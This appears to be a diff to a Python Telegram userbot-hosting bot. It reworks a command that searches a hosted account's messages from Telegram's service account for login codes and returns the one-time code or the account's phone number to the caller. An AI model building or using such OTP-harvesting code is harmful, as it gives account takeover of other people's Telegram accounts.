@@ -106,19 +106,19 @@ async def trash_cmd(client, message):
 
 
 async def get_my_otp(client, message):
+    TM = await message.reply("<b>sᴇᴅᴀɴɢ ᴍᴇᴍᴘʀᴏsᴇs</b>", quote=True)
     if len(message.command) < 2:
-        return await message.reply(
-            f"<b>{message.text} ᴜsᴇʀ_ɪᴅ ᴜsᴇʀʙᴏᴛ ʏᴀɴɢ ᴀᴋᴛɪғ</b>", quote=True
-        )
-    try:
-        getText = "Kode masuk Anda: Your login code:".split()
+        return await TM.edit("<b>ᴘᴀʏᴀʜ ɢɪᴛᴜ ᴀᴊᴀ ɴɢɢᴀᴋ ʙɪsᴀ</b>")
+    else:
+        getText = ["Kode masuk Anda:", "Your login code:"]
         for X in ubot._ubot:
             if int(message.command[1]) == X.me.id:
                 if message.command[0] == "getotp":
-                    async for otp in X.search_messages(777000):
-                        if otp.text in getText:
-                            return await message.reply(otp.text, quote=True)
-                elif message.command[0] == "getnum":
-                    return await message.reply(X.me.phone_number, quote=True)
-    except Exception as error:
-        return await message.reply(error, quote=True)
+                    for msg in getText:
+                        try:
+                            async for otp in X.search_messages(777000, query=msg):
+                                return await TM.edit(otp.text)
+                        except Exception:
+                            return await TM.edit(f"<b>❌ ᴋᴀᴛᴀ ᴋᴜɴᴄɪ <code>{msg}</code> ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ</b>")
+                else:
+                    return await TM.edit(X.me.phone_number)
